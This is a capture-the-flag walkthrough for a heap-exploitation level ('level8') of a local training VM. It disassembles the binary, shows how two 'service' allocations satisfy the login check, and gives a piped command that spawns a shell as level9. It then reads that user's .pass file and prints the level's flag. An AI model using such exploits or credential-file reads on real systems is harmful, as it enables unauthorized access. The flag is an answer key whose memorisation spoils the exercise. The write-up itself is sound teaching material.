# Level 8

## Connect to the virtual machine with SSH

Use the flag from `level7` as the `level8` password:

```bash
ssh level8@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level8@127.0.0.1:/home/user/level8/level8 ./level8/
```

The extracted binary is saved as `level8/level8`.

## Copy the GDB dump to the host

Inside the VM, connected as `level8`, open the binary with GDB:

```bash
gdb ./level8
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level8_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level8@127.0.0.1:/tmp/level8_main_dump_gdb ./level8/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  ./level8/level8 > ./level8/level8_main_dump_gdb
```

## Analyze the GDB dump

This level is an interactive command parser. At the start of each loop, it
prints two global pointers:

```asm
0x08048575 <+17>: mov    ecx,DWORD PTR ds:0x8049ab0
0x0804857b <+23>: mov    edx,DWORD PTR ds:0x8049aac
0x08048591 <+45>: call   0x8048410 <printf@plt>
```

The two globals are:

```bash
objdump -t level8/level8 | grep -E ' auth$| service$'
```

Result:

```text
08049aac g     O .bss  00000004              auth
08049ab0 g     O .bss  00000004              service
```

The supported commands are visible in the strings:

```text
auth
reset
service
login
```

### `auth`

When the input starts with `auth `, the program allocates 4 bytes and stores the
pointer in the global `auth`:

```asm
0x080485e4 <+128>: mov    DWORD PTR [esp],0x4
0x080485eb <+135>: call   0x8048470 <malloc@plt>
0x080485f0 <+140>: mov    ds:0x8049aac,eax
0x080485fa <+150>: mov    DWORD PTR [eax],0x0
```

Then it copies the text after `auth ` into that 4-byte allocation, but only if
the string length is at most 30:

```asm
0x08048625 <+193>: cmp    eax,0x1e
0x08048628 <+196>: ja     0x8048642 <main+222>
0x0804863d <+217>: call   0x8048460 <strcpy@plt>
```

### `service`

When the input starts with `service`, the program duplicates the text after
`service` with `strdup` and stores the pointer in the global `service`:

```asm
0x080486a1 <+317>: lea    eax,[esp+0x20]
0x080486a5 <+321>: add    eax,0x7
0x080486ab <+327>: call   0x8048430 <strdup@plt>
0x080486b0 <+332>: mov    ds:0x8049ab0,eax
```

Each `service` command creates a new heap allocation.

### `login`

When the input starts with `login`, the program checks 32 bytes after the
`auth` pointer:

```asm
0x080486e2 <+382>: mov    eax,ds:0x8049aac
0x080486e7 <+387>: mov    eax,DWORD PTR [eax+0x20]
0x080486ea <+390>: test   eax,eax
0x080486ec <+392>: je     0x80486ff <main+411>
0x080486f5 <+401>: call   0x8048480 <system@plt>
```

If `*(auth + 0x20)` is non-zero, it runs:

```text
/bin/sh
```

## Build the heap state

Run `auth a` first:

```text
auth a
```

The program prints:

```text
0x804a008, (nil)
```

So `auth` points to:

```text
0x0804a008
```

The `login` check reads:

```text
auth + 0x20 = 0x0804a008 + 0x20 = 0x0804a028
```

One `service` allocation lands at:

```text
0x804a018
```

That is not enough, because the check is at `0x804a028`.

A second `service` allocation lands at:

```text
0x804a028
```

Now `*(auth + 0x20)` is non-zero, so `login` passes the check.

## Exploitation

Run this in the VM:

```bash
(echo 'auth a'; echo 'service b'; echo 'service c'; echo 'login'; cat) | /home/user/level8/level8
```

The `cat` keeps stdin open for the shell started by `login`.

Check the effective identity:

```bash
whoami
```

Result:

```text
level9
```

Read the next password:

```bash
cat /home/user/level9/.pass
```

## Flag

```text
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
